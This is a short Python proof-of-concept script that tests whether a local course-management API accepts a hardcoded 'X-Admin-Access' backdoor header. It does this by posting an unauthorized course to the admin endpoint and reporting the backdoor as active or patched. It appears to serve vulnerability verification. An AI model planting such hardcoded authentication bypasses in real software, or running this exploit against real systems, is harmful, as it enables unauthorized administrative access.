import requests
import json
import sys

# CONFIGURATION
BASE_URL = "http://localhost:8000/api/v1"
TARGET_ENDPOINT = f"{BASE_URL}/admin/courses"
BACKDOOR_HEADER = {"X-Admin-Access": "SuperSecretAdmin123"}

# The payload to inject (Safe JSON types to avoid 500 errors)
payload = {
    "code": "HACK404",
    "title": "Backdoor Exploited Course",
    "capacity": 1337,
    "instructor_id": 1,      # Prevents "Orphan" crash
    "prereq_ids": [],        # Empty List (Not String!)
    "schedule": {}           # Empty Dict (Not String!)
}

def run_exploit():
    print(f"[*] Attempting to exploit Backdoor at: {TARGET_ENDPOINT}")
    print(f"[*] Injecting Header: {BACKDOOR_HEADER}")
    
    try:
        response = requests.post(TARGET_ENDPOINT, json=payload, headers=BACKDOOR_HEADER)
        
        # --- ANALYSIS ---
        if response.status_code in [200, 201]:
            print("\n[!!!] VULNERABILITY CONFIRMED [!!!]")
            print(f"Server responded with {response.status_code}: Success.")
            print("The backdoor is ACTIVE. An unauthorized course was created.")
            print("Response Data:", response.json())
        
        elif response.status_code in [401, 403]:
            print("\n[+] ATTACK FAILED (System is Secure)")
            print(f"Server responded with {response.status_code}: Unauthorized.")
            print("The backdoor appears to be PATCHED.")
            
        else:
            print(f"\n[?] Unexpected Response: {response.status_code}")
            print(f"Details: {response.text}")

    except requests.exceptions.ConnectionError:
        print("\n[X] Error: Could not connect to localhost:8000. Is the server running?")

if __name__ == "__main__":
    run_exploit()